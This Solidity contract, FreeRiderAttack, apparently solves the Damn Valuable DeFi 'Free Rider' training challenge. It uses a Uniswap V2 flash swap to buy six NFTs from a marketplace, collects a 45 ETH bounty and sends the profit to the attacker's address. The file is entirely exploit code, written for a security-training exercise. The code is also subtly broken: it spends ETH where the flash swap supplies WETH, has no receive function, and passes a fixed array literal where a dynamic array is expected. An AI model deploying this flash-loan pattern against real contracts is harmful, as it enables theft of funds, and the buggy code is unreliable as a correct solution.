// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../DamnValuableNFT.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {
   function buyMany(uint256[] calldata tokenIds) external payable;
}

// interface IERC721Receiver {
//     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
// }

interface IWETH9 {
    function transfer(address dst, uint wad) external returns (bool);
}



// Todo - Inherit NFTReceiver

contract FreeRiderAttack is IUniswapV2Callee {

    IFreeRiderNFTMarketplace marketplace;
    IUniswapV2Pair pair;
    DamnValuableNFT nft;
    IWETH9 weth;

    address buyerAddress;
    address owner;

    constructor(address _marketplaceAddress, address _buyerAddress, address _pairAddress, address _nftAddress, address _wethAddress) {
        marketplace = IFreeRiderNFTMarketplace(_marketplaceAddress);
        pair = IUniswapV2Pair(_pairAddress);
        nft = DamnValuableNFT(_nftAddress);
        weth = IWETH9(_wethAddress);

        buyerAddress = _buyerAddress;
        owner = msg.sender;
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner may execute");

        // construct the data param payload
        bytes memory payload = abi.encode("sup"); // not actually needed in this case, just junk to trigger flash swap

        // request 15 ETH flashswap from Uniswap
        pair.swap(
            15 ether, 
            0, 
            address(this),
            payload
        );

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        // work out amount to repay (with fees)
        uint repayAmount = ((amount0 * 1000) / 997) + 1;

        // buy all NFTs
        marketplace.buyMany{ value: amount0 }([0, 1, 2, 3, 4, 5]);

        // Send NFTs to buyer contract (receive 45ETH)
        for(uint i=0; i < 6; i++) {
            nft.safeTransferFrom(
                address(this),
                buyerAddress,
                i
            );
        }

        // Repay flashswap amount to repay (≈15 ETH, plus fee)
        weth.transfer(address(pair), repayAmount);

        // Send 30 ETH to attacker EOA
        payable(owner).sendValue(address(this).balance);


    } 

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


}
 